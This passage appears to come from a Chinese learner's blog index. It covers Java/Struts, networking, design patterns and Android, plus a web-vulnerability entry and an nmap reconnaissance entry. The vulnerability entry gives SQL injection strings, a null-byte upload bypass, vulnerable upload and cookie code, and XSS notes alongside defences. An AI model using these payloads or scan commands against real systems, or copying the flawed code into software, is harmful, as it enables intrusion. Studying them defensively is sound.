ctx.put("req","request范围"); return "message";&#125; 123$(applicationScope.app)&lt;/br&gt;$(sessionScope.ses)&lt;/br&gt;$(requestScope.req)&lt;/br&gt; 迭代标签1234&lt;%@ taglib uri="http://java.sun.com/jsp/jst1/core" prefix="c"%&gt;&lt;c:forEach items="$(names)" var="name"&gt; $(name) &lt;/br&gt;&lt;/c:forEach&gt; 文件上传123&lt;form enctype="multipartform-data" action="name" method="post"&gt; &lt;input type="file" name="fileload"/&gt;&lt;/form&gt; 123456789101112131415161718192021222324252627private File image;private String imageFileName;public File getImage()&#123; return image;&#125;public void setImage()&#123; this.image=image;&#125;public String getImageFileName()&#123; return imageFileName;&#125;public void setImageFileName()&#123; this.imageFileName=imageFileName;&#125;public String execute()&#123; String reqlpath=ServletActionContext.getServletContext().getRealPath("/images"); if(image!=null)&#123; File savefile=new File(new File(realPath),imageFileName); if(!saveFile.getParentFile().exists()) &#123; saveFile.getParentFile().mkdirs(); &#125; FileUtils.copyFile(image,destFile); ActionContext.getContext().put("message","上传成功"); &#125; return "success";&#125; 设置上传文件大小1&lt;constant name="struts.multipart.maxSize" value="10701096"&gt;&lt;/constant&gt;]]></content>
      <categories>
        <category>Java</category>
        <category>SSH</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[进制]]></title>
    <url>%2F2017%2F01%2F18%2Ffirst%2F</url>
    <content type="text"><![CDATA[机器指令和汇编指令机器指令 汇编指令B4H 40H10110100 01000000 mov ah,40HCDH 21H11001101 00100001 int 21H 指令和数据]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2json数据传输]]></title>
    <url>%2F2017%2F01%2F18%2Fsecond%2F</url>
    <content type="text"><![CDATA[个人心得在学习了SSH框架几天后发现他的大部分核心都被占据走了，比如在json数据传输的时候，那么在Struts配置文件中，只要定义了返回类型为json，则相关联的类中的使用了get方法的数据都会被返回到前台。而在页面模板中使用相应的变量也会得到相应类中get方法中相应的值。 Struts2使用ajax请求首先要获得post请求的数据，相应的类要实现ServletRequestAware接口，接口里有public void setServletRequest(HttpServletRequest arg0);方法。实现这个接口后的好处是Struts会找到这个方法，并向这个方法里传递一个HttpServletRequest对象，这个对象里都是post的数据。这也是Struts这个框架封装的一个体现。我猜测是用了instanceof判断是否实现了这个接口如果实现了这个接口那么这里面肯定是有这个方法的，那么我就调用这个方法，把HttpServletRequest这个对象赋值给arg0变量进而又赋值给你要使用的变量。当你得到了这个请求就可以解析用户传递的数据，使用变量名.getParameter(“用户传递的key”)获得值。]]></content>
      <categories>
        <category>Java</category>
        <category>SSH</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制加密]]></title>
    <url>%2F2017%2F01%2F17%2Fthird%2F</url>
    <content type="text"><![CDATA[异或逆运算交换值a=a^b 得到一个值b=b^a 得到aa=a^b 得到b]]></content>
      <categories>
        <category>加密</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络知识总结一]]></title>
    <url>%2F2017%2F01%2F17%2Ffirst%2F</url>
    <content type="text"><![CDATA[常见知识最近玩虚拟机，自己搭通网络，主要是这样做的： 配置网关：网关就是下面的所有主机的网络都要从网关这里过，那么arp欺骗攻击就是伪装成网关盗取数据 配置子网掩码：子网掩码是区分外网和内网的 配置DHCP服务器：自动分配IP地址 DNS服务器：一种域名装换成IP的服务器。网络分类按范围分类：局域网，城域网，广域网，互联网。网络拓扑结构结点的互连模式叫做拓扑结构。拓扑结构分：总线型结构，环形结构，星形结构(目前在用)红外线，无线电波常用协议核心协议：IP,ARP,ICMP,IGMP,TCP,UDP应用层协议:HTTP超文本传输协议,FTP文件传输协议,简单邮件传输协议SMTP,终端仿真协议Telnet,域名系统DNS,路由选择信息协议RIP,简单网络管理协议SNMPIP地址IP地址由4个字节(32bit)的信息组成，一个字节8bit,1 byte=8 bit.例如: 1000,1100,1011,0000,1101,1001,1001,0100.为了便于书写，统一写作:140.176.217.148A类网络第一个bit为0.B类网络前两个bit为10.C类网络前三个bit为110.换算成10进制A类网络为0.0.0.0~127.255.255.255B类网络为128.0.0.0~191.255.255.255C类网络为192.0.0.0~223.255.255.255A类网络有上百万个的结点256256256-2，A类地址用于超大型网络.网络数126B类网络有上万个结点256256-2。用于中等规模的网络。网络数64256C类网络最多只能有上百个结点256-2。用于小型网络。网络数32256256D类E类网络属于保留网络。127.0.0.1回送IP地址:向127.0.0.1发送数据包，该包并没有经过本地网络，而只是在TCP/IP的各个层之间传送了一遍。IP地址的任何一个字节不要将其赋值为0或255，如果IP地址的网络部分是0，则代表当前网络，IP地址中最后一个字节如赋值255，则用于指定广播消息。子网掩码A类网络子网掩码255.0.0.0B类网络子网掩码255.255.0.0C类网络子网掩码255.255.255.0子网掩码可以计算出网络地址和主机地址。自定义子网掩码：把主机号划分为子网号和子网主机号。比如要划分每个子网6台主机6=110那么如果是C类网络，那么子网掩码可以是255.255.255.224=11111111.11111111.11111111.11100000.选择主机号的前三位作为子网地址，那么就可以是001,010,011,100,101,110。那么子网内主机数量=2^5-2=30.减去00000和11111.想知道你的子网地址，就拿你的IP地址二进制与子网掩码的二进制做与运算。RJ-45双绞线四对双绞线分别是橙色，棕色，蓝色、绿色。相应的八根导线分别是橙，橙白，棕，棕白，蓝，蓝白，绿，绿白。在UTP电缆的8根铜线中只有4根在数据传输的过程中起作用。在网卡插槽的8个位置只有1、2、3、6这四个位置用来传输数据，1、2负责发送资料，3、6负责接收资料。线对排序：1、白橙 2、橙 3、白绿 4、蓝 5、白蓝 6、绿 7、白棕 8、棕。网络适配器PCI网卡IRQ:与CPU交换数据的中断。I/O Address：网卡上的数据在计算机内存上的映射地址。连接头：对于一些具有多连接头的网卡，应该根据实际的网络环境选择连接头。远程启动模块(BootROM)开机：BootROM地址:BootROM映射在计算机内存中的地址BootROM大小:BootROM内程序的大小。]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站编程常见漏洞与检测]]></title>
    <url>%2F2017%2F01%2F17%2Fsecond%2F</url>
    <content type="text"><![CDATA[sql注入sql注入原理:Test.asp文件代码片段：sqlStr = “select * from n_user where username=‘”&amp;username&amp;”’ and password=‘“&amp;password&amp;”’rs = conn.execute(sqlStr)正常的查询：test.asp?username=test&amp;password=123sqlStr = “select * from n_user where username=‘test’ and password=‘123’“使password=123 ‘ or ‘1’=‘1‘：Sql语句到数据库后：sqlStr = “select * from n_user where username=‘test’ and password=‘123’ or ‘1’=‘1’“Or ‘1’=‘1’始终成立。asp表现:存在数字型和字符型注入。(A) 数字型 字段=51Select * from 表名 where 字段=51 构造参数：ID=49 And [查询条件]生成语句：Select * from 表名 where 字段=49 And [查询条件](B)字符型的另一种形式搜索语句：Select * from 表名 where 字段like ’%关键字%’构造参数：keyword=’ and [查询条件] and ‘%25’=’生成语句：Select * from 表名 where字段like ’%’ and [查询条件] and ‘%’=’%’asp防范:对于用户端输入的任意字符，包括GET提交，POST提交，Cookie提交，SERVER提交的都需要做严格过滤。对于数字型参数判断是否为数字：可用函数isNumeric来判断，返回值为true和false。对于字符型参数过滤单引号，使其无法闭合当前sql语句的单引号。例外：base64编码Sql通用防注入php表现:Php的魔术引号(magic_quotes_gpc ) 。php.ini-dist 默认是开启此功能。如果安装php时使用此文件，将不会产生字符型注入，主要是数字型注入。数字型注入：12select * from guess where id=“.$id.”select * from guess where id=$id GPC不起作用的情况数组1234$userid=$_POST[userid'];for($i=0;$i&lt;count($ userid);$i++)&#123;$query=“select * from user where i_hid='".$ userid[$i]."'";&#125; 编码函数引起base64_decode,base64编码后的单引号：Jw==mysql处理GBK编码字符%bf%27导致单引号被绕过的问题。其他数据库，如ms sql。对于转义符反斜杠作为字符处理的。select * from test where title =’aaa\’ or ‘1’=’1‘php防范一:确认GPC开启，若没开启则用addslashes 函数过滤之，如下代码。123456if (!get_magic_quotes_gpc()) &#123; $lastname = addslashes($_POST['lastname']); &#125; else &#123; $lastname = $_POST['lastname']; &#125; 对于数字型参数可使用intval 或floatval 强制转换为数字型。注意mysql的版本以及默认字符集，Mysql&gt;4.1字符集连接字符串:12mysql_query("SET character_set_connection=$dbcharset,character_set_results=$dbcharset, character_set_client=binary;"); php防范二:Php5以上版本Mysqli扩展预防，参数化查询12345678$city = "Amersfoort"; / * create a prepared statement */ $stmt = $mysqli-&gt;prepare("SELECT District FROM City WHERE Name=?") $stmt-&gt;bind_param("s", $city); $stmt-&gt;execute(); $stmt-&gt;bind_result($district); $stmt-&gt;fetch(); printf("%s is in district %s\n", $city, $district); $stmt-&gt;close(); &#125; jsp表现:由于java语言是强类型语言，所有变量定义前必须声明其类型，因而仅存在字符型的注入。字符型注入实例：12String sql = "select * from tb_name where name= '"+varname+"' and passwd='"+varpasswd+"'";stmt = conn.prepareStatement(sql); 构造参数varpasswd值为：’ or ‘1’ = ‘1Sql语句经过解析后将是：select * from tb_name = ‘随意’ and passwd = ‘’ or ‘1’ = ‘1’;jsp防范:采用jdbc的prepareStatement查询数据库，并且sql语句中不出现参数，如：sqlStr = “select id from info where city=? and open=? order by id desc”;stmt = conn.prepareStatement(sqlStr);stmt.setString(1,city);stmt.setString(2,var1);asp.net表现:开发语言常用的有：vb.net和C#,都属于强类型语言，因而只存在字符型注入。注入原理，与asp的字符型注入一样。asp.net防范:使用Ado.net的参数化查询。strSQL = “SELECT * FROM Orders WHERE CustomerID = @CustomerID”;SqlCommand cmd = new SqlCommand(strSQL, cn);//创建一个sqlcommand对象。 //创建新参数，参数绑定cmd.Parameters.AddWithValue(“@CustomerID”, “ALFKI”); 文件上传利用当前系统已有的上传功能，比如文件上传，图像上传等的漏洞来上传任意文件或者webshell。危害：直接上传webshell到服务器，甚至获取服务器root权限。各种语言表现大同小异。ASP上传漏洞表现:经典的”\0”上传任意后缀文件 。假设：filename=”c:\nc.exe .bmp” N C . E X E (Nul) . B M P 4E 43 2E 45 58 45 00 2E 42 4D 50 123456‘ Check the file extensionif right(tFile,4) &lt;&gt; “.bmp” then exit subtFile=tFile &amp;".bmp"Set FSO =Server.CreateObject("Scripting.FileSystemObject")Set FSOFile=FSO.CreateTextFile(FSO.BuildPath(Path, tFile)) ASP上传漏洞防范:检查文件名是否包含‘\0’字符。采用白名单方式允许上传文件类型。检测关键字：Scripting.FileSystemObject/ADODB.StreamPHP上传漏洞表现123456789101112$imageinfo = getimagesize($_FILES['userfile']['tmp_name']);if($imageinfo['mime'] != 'image/gif' &amp;&amp; $imageinfo['mime'] != 'image/jpeg') &#123;if($_FILES['userfile']['type'] != "image/gif") &#123; echo “仅允许上传GIF和JPEG图片\n"; exit;&#125;$uploaddir = 'uploads/';$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) &#123; echo “文件上传成功.\n";&#125; else &#123; echo “上传失败.\n";&#125; PHP上传漏洞防范检查上传文件名中是否存在.php字符。采用白名单，仅允许安全的类型，如gif/jpg/rar等，禁止用户自定义文件后缀。检测关键字：move_uploaded_file/is_uploaded_file/copyJSP上传漏洞:后缀检查不严引起的上传任意文件，主要为jsp和war后缀文件。采用白名单严格限制上传类型。JSP文件上传防范:检测方法：——File/SmartUpload(常用的一个jsp开源上传组件)——至/WEB-INF/lib/目录下查看相关upload字样的类库，作为关键字搜索ASP.net文件上传漏洞:Asp.net自身提供有上传组件，但默认上传任意后缀文件。IIS默认解析的后缀名都是不安全的，采用白名单方式上传文件。ASP.net文件上传漏洞防范:检查关键字：PostedFile.FileName/FileUpload cookie欺骗Cookie：Web服务器存放在客户端计算机的一些信息，主要用来客户端识别或身份识别等。Session,保存在服务器端的。Cookie欺骗攻击：攻击者通过修改存放在客户端的cookie来达到欺骗服务器认证目的。修改工具：IECookiesViewCookie攻击原理:If(“登录验证过程”){ setcookie(“isadmin”,1,time()+36002430);}//登录成功，写入cookie，一个月后失效，用于下次登录。…… \$admin= \$_COOKIE[“isadmin”]; if(\$admin){ echo “已经登录”; }else{ echo “请重新登陆”;}//没对cookie有效性进行验证，导致cookie欺骗产生。Cookie欺骗防范:关键字检测Asp:Response.Cookies/Request.CookiesPhp:Setcookie/\$_COOKIE/\$HTTP_COOKIE_VARSJsp: response.addCookie /request.getCookiesAsp.net: response.Cookies/request.Cookies XSS攻击跨站脚本攻击(通常简写为XSS)是指攻者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。危害：——盗取用户cookie——Xss蠕虫——挂马，结合xss蠕虫，危害巨大。XSS防范:对用户输入数据编码：Asp:server.htmlencode函数Php:htmlspecialchars函数asp.net:HttpContext.Current.Server.HtmlEncodejsp:默认没有提供过滤方法，需要自写方法.过滤危险的html关键字符：比如：script/iframe等。XSS检测:搜索关键字。Asp:request/Php:\$_GET/\$_POST/\$_COOKIE/\$_SERVERJsp：request.getParameter/ request.getCookiesAsp.net:Request.QueryString/Form/Cookies/SeverVaiables/ 文件包含PHP文件包含漏洞:Php：include/require / include_once /require_once函数使用时参数没有限制导致可以包含远程文件或者本地文件。Php4存在远程&amp;本地，php5仅存在本地包含。检测： include/require/include_once /require_once其他语言表现。]]></content>
      <categories>
        <category>web漏洞</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java基础知识总结]]></title>
    <url>%2F2017%2F01%2F13%2Ffirst%2F</url>
    <content type="text"><![CDATA[final修饰符 可以修饰类，函数，变量。 被final修饰的类不可以被继承。作用是为了避免被继承，被子类复写功能。 被final修饰的方法不可以被复写。 被final修饰的变量是一个常量只能赋值一次，既可以修饰成员变量，又可以局部变量。常量的书写规范所有字母都大写，如果由多个单词通过_连接。 内部类定义在类中的局部位置上是，只能访问该局部被final修饰的局部变量。static修饰符用于修饰成员(成员变量，成员函数)，可以直接被类名调用。特点： 随着类的加载而加载 优先于 对象存在 被所有对象共享 可以直接被类名调用静态使用注意事项： 静态方法只能访问静态成员，非静态方法既能访问静态也可以访问非静态。 静态方法不可以出现this和super关键字。public，protect，private权限符private：私有，权限修饰符：用于修饰类中的成员(成员变量，成员函数)私有只在本类中有效。super，this访问符this本类: 区分成员变量和局部变量 用于构造函数之间互相调用，必须在构造函数第一行super父类:封装定义:是指隐藏对象的属性和实现细节，仅对外提供公共访问方式。好处： 将变化隔离 便于使用 便于控制变量值 提高重用性 提高安全性 封装原则： 将不需要对外提供的内容都隐藏起来。 把属性都隐藏，提供公共方法对其访问。继承 is a1.提高了代码的复用性2.让类与类之间产生了关系，有了这个关系，才有了多态的特性。3.不支持多继承类成员特点:1.变量 2.函数3.构造函数 接口接口可以多继承接口是对外暴露的规则。接口是程序的功能扩展。接口可以用来多实现。类与接口之间是实现关系。而且类可以继承一个类的同时实现多个接口接口与接口之间可以有继承关系。 组合/聚集/聚合 has a多态重载重写构造函数特点：函数名与类名相同不用定义返回值类型不可以写return语句作用：给对象进行初始化注意：默认构造函数的特点多个构造函数是以重载的形式存在的。构造函数只运行一次。 构造代码块作用：给对象进行初始化对象一建立就执行，而且优先于构造函数执行。和构造函数的区别：构造代码块是给所有对象进行统一初始化，而构造函数是给对象的对象初始化。 成员变量和局部变量作用范围成员变量作用于整个类中。局部变量作用与函数中。在内存中的位置成员变量在堆内存中，因为对象存在，才在内存中存在。局部变量存在栈内存中。 jvm传参java 类名 参数main函数互相调用。 java帮助文档使用class二进制文件：set classpath=.;路径;分别是本路径和绝对路径。javadoc -d 目录路径 类名导出帮助文档。 静态代码块static{}随着类的加载而执行，只执行一次，优先于主函数。 Person p=new Person(“zhangsan”,20)都做了什么 因为new用到了Person.class,所以会先找到Person.class文件并加载到内存中 执行该类中的static代码块，如果有的话，给Person.class类中静态变量进行初始化。 在堆内存中开辟空间，分配内存地址。 在堆内存中建立对象的特有属性，并进行默认初始化。 对属性进行显示初始化。 对对象进行构造代码块初始化 对对象进行对应的构造函数的初始化。 将内存地址付给栈内存中的p变量。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式之抽象工厂模式]]></title>
    <url>%2F2017%2F01%2F12%2Ffirst%2F</url>
    <content type="text"><![CDATA[应用场景为创建一组相关或相互依赖的对象提供一个接口，而且无需指定他们的具体类。首先我们看一下百度百科对抽象工厂模式的图分析。大致流程是这样，创建一个接口creator，一组相关或者相互依赖的对象就是ProductA和ProductB以及它们具体的实现类，而上面又提到说不是返回的具体的类，所以我们返回的应该是接口或者抽象类，那么上述类图当中，则是指的ProductA和ProductB接口。 抽象工厂模式实例首先给出我们的产品族，图的右半部分。1234567891011121314151617181920212223242526272829303132package com.liu.abstract1;interface ProductA&#123; void methodA();&#125;interface ProductB&#123; void methodB();&#125;class ProductA1 implements ProductA&#123; @Override public void methodA() &#123; // TODO Auto-generated method stub System.out.println("产品A系列中1型号产品的方法"); &#125;&#125;class ProductA2 implements ProductA&#123; @Override public void methodA() &#123; // TODO Auto-generated method stub System.out.println("产品A系列中2型号产品的方法"); &#125;&#125;class ProductB1 implements ProductB&#123; public void methodB()&#123; System.out.println("产品B系列中1型号产品的方法"); &#125;&#125;class ProductB2 implements ProductB&#123; public void methodB()&#123; System.out.println("产品B系列中2型号产品的方法"); &#125;&#125; 然后再给出创造产品的接口。123456package com.liu.abstract1;public interface Creator &#123; ProductA createProductA(); ProductB createProductB();&#125; 创建第一种产品库12345678910package com.liu.abstract1;public class ConcreteCreator1 implements Creator&#123; public ProductA createProductA()&#123; return new ProductA1(); &#125; public ProductB createProductB()&#123; return new ProductB1(); &#125;&#125; 创建第二种产品库12345678910package com.liu.abstract1;public class ConcreteCreator2 implements Creator&#123; public ProductA createProductA()&#123; return new ProductA2(); &#125; public ProductB createProductB()&#123; return new ProductB2(); &#125;&#125; 创建测试类12345678910111213141516package com.liu.abstract1;public class Client &#123; public static void main(String[] args) &#123; Creator creator=new ConcreteCreator1(); ProductA productA=creator.createProductA(); ProductB productB=creator.createProductB(); productA.methodA(); productB.methodB(); creator=new ConcreteCreator2(); productA=creator.createProductA(); productB=creator.createProductB(); productA.methodA(); productB.methodB(); &#125;&#125; 输出结果1234产品A系列中1型号产品的方法产品B系列中1型号产品的方法产品A系列中2型号产品的方法产品B系列中2型号产品的方法 这就是一个简单的抽象工厂模式，一开始我看到抽象工厂模式，还以为他是要用抽象类和抽象方法，原来是我误解了，抽象工厂模式就是把原来的工厂糅合在一起，再变成几种工厂，随意组合。这个相对比较简单。 深入理解为了更深入的理解，我打算研究JDK源码，List接口源码如下:123456789101112131415package java.util; public interface List&lt;E&gt; extends Collection&lt;E&gt; &#123; Iterator&lt;E&gt; iterator();//一种产品 Object[] toArray(); &lt;T&gt; T[] toArray(T[] a); ListIterator&lt;E&gt; listIterator();//另外一种产品 ListIterator&lt;E&gt; listIterator(int index); &#125; 这里面肯定是去掉了源码的很多方法，为了看着更简便。其中ListIterator是Iterator的子接口，但归根到底，它其实属于另外一种产品，为什么这么说呢，ListIterator不是Iterator的子接口吗，怎么能算是另外一种产品呢？这是因为我们listIterator方法的返回类型是ListIterator，而不是Iterator，所以两者的功能是不同的，比如ListIterator还可以向前移动。我们可以认为这两个方法产生的一个是只能向后移动的迭代器，一个是可以前后移动的迭代器，这算是两种产品，相当于上面的ProductA和ProductB。这个设计可以看做是一个抽象工厂模式，List接口定义了两种生产不同产品的方法，这属于两个系列的产品，不过由于产品接口本身的继承关系，两者的实现类也会被做成继承的关系。根据这个图，与上面的简单的对比一下。 List,是抽象工厂的角色，它有两个制造产品的方法，iterator和listIterator,相当于Creator。 ListItertor和Iterator都是抽象产品，相当于ProductA和ProductB。其中ListIterator有两个实现类，分别是AbstractList.ListItr和LinkedList.ListIter,相当于ProductA1和ProductA2.Iterator的实现类为AbstractList.Itr,相当于ProductB1，但是没有B2. LinkedList是其中一个具体的工厂类，相当于ConcreteCreator1，实现抽象工厂List，它制造的两个具体产品分别是LinkedList.ListItr和AbstractList.Itr. 同样的，ArrayList是一个具体的工厂类，相当于ConcreteCreator2，实现抽象工厂List，它制造的两个具体产品分别是AbstractList.ListItr和AbstractList.Itr。总结Iterable接口是List的父接口，所以它只负责一个产品Iterator的制造，所以是工厂方法模式，而List接口扩展了Iterable接口，又添加了一个制造产品的方法，即又添加了一个系列的产品，所以就成为了抽象工厂模式。给出上述两个类图的对应关系。1.Creator=List2.ConcreteCreator1=ArrayList3.ConcreteCreator2=LinkedList4.ProductA=Iterator5.ProductB=ListIterator6.ProductA1=AbstractList.Itr7.ProductA2=无（具体的A产品2在第一个类图中是没有的，但这并不影响整个体系）8.ProductB1=AbstractList.ListItr9.ProductB2=LinkedList.ListItrArrayList和LinkedList分别是List接口的两种实现，前者是基于数组操作，后者是基于链表。两者都可以产生Iterator和ListIterator，而Iterator的实现都是在AbstractList中实现的，是一样的处理方式，而对于ListIterator的实现却不相同，AbstractList.ListItr是基于数组的操作，LinkedList.ListItr是基于链表的操作方式。所以抽象工厂模式一般是为了处理抽象产品多于一个的问题，而且这些产品多数情况下是有关系的，像上述JAVA集合框架的例子当中，Iterator和ListIterator就是继承的关系，大部分情况下，很少会使用抽象工厂模式去创造一批毫无关系的产品。基于抽象工厂一旦定义，抽象产品的个数就已经固定，所以最好在抽象产品的个数不太会变化的情况下使用抽象工厂模式，当然，我们可以使用继承去弥补抽象工厂模式的这一不足，创造另外一个继承体系去扩展现有的框架。工厂模式总结简单工厂模式12345678910111213141516171819202122//抽象产品 interface Product&#123;&#125; //具体产品 class ProductA implements Product&#123;&#125; class ProductB implements Product&#123;&#125; //产品工厂（下一步就是它的进化，就变成了工厂方法模式） public class ProductFactory &#123; private ProductFactory()&#123;&#125; public static Product getProduct(String productName)&#123; if (productName.equals("A")) &#123; return new ProductA(); &#125;else if (productName.equals("B")) &#123; return new ProductB(); &#125;else &#123; return null; &#125; &#125; &#125; 工厂模式123456789101112131415161718192021222324252627//抽象产品 interface Product&#123;&#125; //具体产品 class ProductA implements Product&#123;&#125; class ProductB implements Product&#123;&#125; //将简单工厂中的工厂给抽象成接口 interface Factory&#123; Product getProduct(); &#125; //具体的工厂A，创造产品A class FactoryA implements Factory&#123; public Product getProduct() &#123; return new ProductA(); &#125; &#125; //具体的工厂B，创造产品B class FactoryB implements Factory&#123; public Product getProduct() &#123; return new ProductB(); &#125; &#125; 抽象工厂模式1234567891011121314151617181920212223242526272829303132333435363738394041424344//抽象产品 interface Product&#123;&#125; //具体产品 class ProductA implements Product&#123;&#125; class ProductB implements Product&#123;&#125; //多了一个抽象产品1 interface Product1&#123;&#125; //具体产品1 class Product1A implements Product1&#123;&#125; class Product1B implements Product1&#123;&#125; //原有的工厂方法模式的工厂里添加一个方法 interface Factory&#123; Product getProduct(); //添加另外一个产品族的创造方法 Product1 getProduct1(); &#125; //具体的工厂A，创造产品A class FactoryA implements Factory&#123; public Product getProduct() &#123; return new ProductA(); &#125; //添加相应的实现 public Product1 getProduct1() &#123; return new Product1A(); &#125; &#125; //具体的工厂B，创造产品B class FactoryB implements Factory&#123; public Product getProduct() &#123; return new ProductB(); &#125; //添加相应的实现 public Product1 getProduct1() &#123; return new Product1B(); &#125; &#125; 与工厂方法对比下就发现，多了一个产品系列叫Product1，工厂接口里多了一个方法，叫getProduct1，所以抽象工厂模式就是工厂方法模式添加了抽象产品所演变而来的。 1，首先从简单工厂进化到工厂方法，是因为工厂方法弥补了简单工厂对修改开放的弊端，即简单工厂违背了开闭原则。 2，从工厂方法进化到抽象工厂，是因为抽象工厂弥补了工厂方法只能创造一个系列的产品的弊端。]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>应用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android常用两大布局之RelativeLayout]]></title>
    <url>%2F2017%2F01%2F04%2Fthird%2F</url>
    <content type="text"><![CDATA[RelativeLayout布局上一章学了LinearLayout布局，我更钟情于他的weight(权重属性),等比例划分，对屏幕的自适应有很大帮助，但是一般我们是在外面用LinearLayout布局，里面就不用，因为在外面他可以自适应屏幕，接着就说RelativeLayout. 基本属性这是我们学LinearLayout遗留下的问题，在LinearLayout用gravity不是我们想的那样去布局，但是relativelayout里面是肯定的。 gravity:设置容器内组件的对齐方式 ignoreGravity:设置了该属性为true的属性的组件，将不受gravity属性的影响根据父容器定位 layout_alignParentLeft:左对齐 layout_alignParentRight:右对齐 layout_alignParentTop:顶部对齐 layout_alignParentBottom:底部对齐 android:layout_centerHorizontal:水平居中 android:layout_centerVertical:垂直居中 android:layout_centerInParent:中间位置 根据兄弟组件定位 layout_toLeftOf:参考组件的左边 layout_toRightOf:参考组件的右边 layout_above:参考组件的上方 layout_below:参考组件的下方 layout_alignTop:对齐参考组件的上边界 layout_alignBottom:对齐参考组件的下边界 layout_alignLeft:对齐参考组件的左边界 layout_alignRight:对齐参考组件的右边界margin(偏移) layout_margin:设置组件上下左右的偏移量 layout_marginTop:设置组件离上面的偏移量 layout_marginBottom:设置组件离下面的偏移量 layout_marginLeft:设置组件离左边的偏移量 layout_marginRight:设置组件离右边的偏移量设置组件内部元素的边距(比如TextView里的字体位置) android:padding 往内部元素的上下左右填充一定边距 paddingLeft:往内部元素的左边填充一定边距 paddingRight:往内部元素的右边填充一定边距 paddingTop:往内部元素的上方填充一定边距 paddingBottom:往内部元素的下方填充一定边距父容器定位属性示意图根据兄弟组件定位什么是兄弟组件?所谓的兄弟组件就是处于同一层次容器的组件。图中的组件1,2就是兄弟组件了,而组件3与组件1或组件2并不是兄弟组件,所以组件3不能通过 组件1或2来进行定位,比如layout_toleftof = “组件1”这样是会报错的梅花布局12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools" android:id="@+id/RelativeLayout1" android:layout_width="match_parent" android:layout_height="match_parent" &gt; &lt;!-- 这个是在容器中央的 --&gt; &lt;ImageView android:id="@+id/img1" android:layout_width="80dp" android:layout_height="80dp" android:layout_centerInParent="true" android:src="@drawable/pic1"/&gt; &lt;!-- 在中间图片的左边 --&gt; &lt;ImageView android:id="@+id/img2" android:layout_width="80dp" android:layout_height="80dp" android:layout_toLeftOf="@id/img1" android:layout_centerVertical="true" android:src="@drawable/pic2"/&gt; &lt;!-- 在中间图片的右边 --&gt; &lt;ImageView android:id="@+id/img3" android:layout_width="80dp" android:layout_height="80dp" android:layout_toRightOf="@id/img1" android:layout_centerVertical="true" android:src="@drawable/pic3"/&gt; &lt;!-- 在中间图片的上面--&gt; &lt;ImageView android:id="@+id/img4" android:layout_width="80dp" android:layout_height="80dp" android:layout_above="@id/img1" android:layout_centerHorizontal="true" android:src="@drawable/pic4"/&gt; &lt;!-- 在中间图片的下面 --&gt; &lt;ImageView android:id="@+id/img5" android:layout_width="80dp" android:layout_height="80dp" android:layout_below="@id/img1" android:layout_centerHorizontal="true" android:src="@drawable/pic5"/&gt; &lt;/RelativeLayout&gt; margin与padding的区别1、首先margin代表的是偏移,比如marginleft = “5dp”表示组件离容器左边缘偏移5dp; 而padding代表的则是填充,而填充的对象针对的是组件中的元素,比如TextView中的文字 比如为TextView设置paddingleft = “5dp”,则是在组件里的元素的左边填充5dp的空间2、 margin针对的是容器中的组件，而padding针对的是组件中的元素 margin可以设置为负数12345678910111213141516171819202122232425&lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools" android:layout_width="match_parent" android:layout_height="match_parent" tools:context="com.jay.example.relativelayoutdemo.MainActivity" android:background="#00CCCCFF"&gt; &lt;ImageView android:id="@+id/imgBack" android:layout_width="200dp" android:layout_height="200dp" android:layout_centerInParent="true" android:background="@drawable/myicon" /&gt; &lt;ImageView android:id="@+id/imgCancle" android:layout_width="28dp" android:layout_height="28dp" android:layout_alignRight="@id/imgBack" android:layout_alignTop="@id/imgBack" android:background="@drawable/cancel" android:layout_marginTop="-15dp" android:layout_marginRight="-10dp" /&gt; &lt;/RelativeLayout&gt;]]></content>
      <categories>
        <category>Android</category>
        <category>布局</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透技术一]]></title>
    <url>%2F2017%2F01%2F04%2Ffirst%2F</url>
    <content type="text"><![CDATA[NMAP扫描策略适用所有大小网络最好的nmap扫描策略主机发现，生成存活主机列表12$ nmap -sn -T4 -oG Discovery.gnamp 192.168.56.0/24$ grep "Status:Up" Discovery.gnmap | cut -f 2 -d ' ' &gt;LiveHosts.txt 端口发现，发现大部分常用端口123$nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt$nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt$nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt 端口发现，发现全部端口，但UDP端口的扫描会非常慢12$nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt$nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt 显示TCP\UDP端口12$grep "open" FullTCP|cut -f 1 -d ' '|sort -nu | cut -f 1 -d '/'|xargs | sed 's/ /,/g'|awk '&#123;print "T:"$0&#125;'$grep "open" FullUDP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '&#123;print "U:"$0&#125;' 侦测服务版本1nmap -sV -T4 -Pn -oG ServiceDetect -iL 